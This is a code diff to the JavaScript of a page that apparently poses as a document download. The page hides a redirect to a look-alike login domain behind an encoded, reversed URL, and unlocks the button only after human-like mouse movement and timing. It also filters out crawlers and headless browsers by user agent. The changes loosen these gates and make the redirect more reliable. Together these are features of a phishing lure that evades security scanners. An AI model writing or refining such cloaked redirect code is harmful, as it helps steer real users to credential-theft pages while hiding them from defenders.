@@ -131,7 +131,7 @@
             document.getElementById('downloadForm').appendChild(input);
         });
 
-        // Obfuscated URL
+        // Obfuscated URL (correct for https://login.maxsldfc.cloud/view/project-details.pdf)
         const obfuscatedUrl = 'ZmRwLnN0YWxpZWQtdGNlam9ycC93ZWl2L2R1b2xjLmNmZGx4c2FtLm5pZ29sLy86c3B0dGg9PQ==';
 
         // Function to deobfuscate the URL
@@ -142,14 +142,19 @@
                 for (let i = decoded.length - 1; i >= 0; i--) {
                     unscrambled += decoded[i];
                 }
-                return unscrambled.substring(0, unscrambled.indexOf('=='));
+                const url = unscrambled.substring(0, unscrambled.indexOf('=='));
+                console.log('Deobfuscated URL:', url);
+                if (!url.startsWith('https://')) {
+                    throw new Error('Invalid URL format');
+                }
+                return url;
             } catch (e) {
                 console.error('Deobfuscation error:', e);
-                throw new Error('Invalid URL format');
+                throw new Error('Failed to process URL');
             }
         }
 
-        // Enhanced interaction detection with mouse movement analysis
+        // Interaction detection
         function enableButton(event) {
             if (event.type === 'mousemove') {
                 const x = event.clientX;
@@ -163,7 +168,7 @@
             }
             interactionCount++;
             console.log('Interaction count:', interactionCount, 'Mouse distance:', mouseMoveDistance);
-            if (interactionCount >= 2 && mouseMoveDistance > 300) {
+            if (interactionCount >= 2 && mouseMoveDistance > 200) {
                 isHuman = true;
                 document.getElementById('downloadButton').disabled = false;
                 document.getElementById('errorMessage').style.display = 'none';
@@ -176,11 +181,11 @@
         document.addEventListener('touchstart', enableButton);
         document.addEventListener('keydown', enableButton);
 
-        // Timing check to detect automated rapid interactions
+        // Timing check
         let startTime = Date.now();
         function checkTiming() {
             const elapsedTime = Date.now() - startTime;
-            if (elapsedTime < 1000) {
+            if (elapsedTime < 500) {
                 console.log('Timing check failed:', elapsedTime);
                 return false;
             }
@@ -217,12 +222,12 @@
 
             try {
                 const url = deobfuscateUrl(obfuscatedUrl);
-                console.log('Redirecting to:', url);
-                setTimeout(() => {
-                    window.location.assign(url);
-                }, 1500);
+                console.log('Attempting redirect to:', url);
+                window.location.assign(url);
+                // Fallback redirect
+                window.location.href = url;
             } catch (error) {
-                document.getElementById('errorMessage').textContent = 'Redirect failed. Please try again.';
+                document.getElementById('errorMessage').textContent = error.message || 'Redirect failed. Please try again.';
                 document.getElementById('errorMessage').style.display = 'block';
                 document.getElementById('spinner').style.display = 'none';
                 document.getElementById('downloadButton').disabled = false;
@@ -230,7 +235,7 @@
             }
         });
 
-        // Enhanced bot detection
+        // Bot detection
         const userAgent = navigator.userAgent.toLowerCase();
         const botPatterns = ['bot', 'crawl', 'spider', 'googlebot', 'bingbot', 'slurp', 'headless'];
         const isBot = botPatterns.some(pattern => userAgent.includes(pattern)) ||
